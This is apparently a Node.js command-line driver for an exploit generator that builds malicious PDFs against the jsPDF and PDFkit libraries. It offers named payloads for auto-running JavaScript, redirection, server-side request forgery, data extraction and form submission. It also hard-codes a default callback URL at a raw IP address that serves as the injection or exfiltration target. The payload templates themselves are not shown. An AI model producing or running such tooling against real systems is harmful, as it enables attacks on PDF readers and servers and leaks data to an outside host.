const { ArgumentParser } = require('argparse');
const { version } = require('../package.json');

const parser = new ArgumentParser({
  description: 'Argparse example'
});
 
parser.add_argument('-v', '--version', { action: 'version', version });
parser.add_argument('-e', '--exploit', { help: 'Specify exploit to use'});
parser.add_argument('-l', '--lib', { help: 'Select library to exploit jsPDF or PDFkit', required:true});
parser.add_argument('-L', '--List', { help: 'List avaliable exploits', action:'store_true' });
parser.add_argument('-o', '--output', { help: 'Specify output file name'});
parser.add_argument('-u', '--uri', { help: 'Specify URI to inject/SSRF'});
// parser.add_argument('-k', '--kek', { help: 'Print n number of keks' });


function list_jsPDF_exploits(){
	console.log('Avaliable exploits are: \nautorun \nsimple_js \nredirection \nPDFSSRF \nextraction')
}


function list_PDFkit_exploits(){
	console.log('Avaliable exploits are: js_submitForm')
}


function checkArgs(myArgs){
	if (myArgs.lib){
		if(myArgs.lib !== "jsPDF" && myArgs.lib !== "PDFkit"){
			console.log("Unknown library, please run -l [jsPDF|PDFkit] -L to list out avaliable exploits")
			return 0
		}
		// pass lib check, continue with other checks
	}

	// checks if user wants to list avaliable expoits
	if (myArgs.List) 
	{
		// requires user to narrow which lib to display 
		if (myArgs.lib == 'jsPDF'){
			list_jsPDF_exploits()
		}else if (myArgs.lib == 'PDFkit'){
			list_PDFkit_exploits()
		} else {
			console.log("Unknown library")
		}
		return 0
	}

	// program cant run if exploit not defined
	if (myArgs.exploit == undefined)
	{
		console.log("No exploit given, run -l [jsPDF|PDFkit] -L to list out avaliable exploits")
		return 0
	}

	if (myArgs.output == undefined)
	{
		console.log("No output file name was given, will use default name")
	}
	return 1
}

function createExploit(vuln_lib, exploit, outname, direction='http://20.211.25.32/index.php'){
	switch(vuln_lib){
	case 'jsPDF':
		const jsPDF_template = require("./jsPDF_template.js");
		const template_jsPDF = new jsPDF_template;
		
		var dict = {}
		dict['autorun'] = template_jsPDF.bake_autorun; 
		dict['simple_js'] = template_jsPDF.bake_simple_js;
		dict['redirection'] = template_jsPDF.bake_redirection;
		dict['PDFSSRF'] = template_jsPDF.bake_PDFSSRF;
		dict['extraction'] = template_jsPDF.bake_extraction;
		// console.log(template_jsPDF)
		console.log("generating " + exploit);
		template_status = dict[exploit](outname, direction)
		if (template_status[1] == 1){
			console.log("Finished bake " + exploit)
			return template_status[0]
		} else {			
		console.log("Failed to bake" + exploit)
		return -1
		}
		break;
	case 'PDFkit':
		console.log("running PDFkit");
		const PDFkit_template = require("./PDFkit_template.js");
		const template_PDFkit = new PDFkit_template;
		var dict = {}
		dict['js_submitForm'] = template_PDFkit.js_submitForm; 
		console.log("generating " + exploit);
		// dict[exploit](outname, direction)
		template_status = dict[exploit](outname, direction)
		template_status.then(status => {
			console.log(status)
			if (status[1] == 1){
			console.log("Finished bake " + exploit)
			return status[0]
		}else {			
		console.log("Failed to bake" + exploit)
		return -1
		}
		})
		break;
	default:
		console.log("lol, some error happened")
		return -1
		break;
	}
}


function test_exploit(){
	return -1;
}

function main(){
	myArgs = parser.parse_args()
	// console.log(myArgs)
	if(checkArgs(myArgs) == 0){
		process.exit(0)
	}
	const vuln_lib = myArgs.lib;
	const exploit = myArgs.exploit
	const outname = myArgs.output
	const direction = myArgs.uri

	const myfile = createExploit(vuln_lib, exploit, outname, direction)
	if(myfile == -1){
		console.log("Failed to create file, unable to test")
		process.exit(-1)
	} else {
		console.log("myfile returned with:", myfile)

	}
}



main()
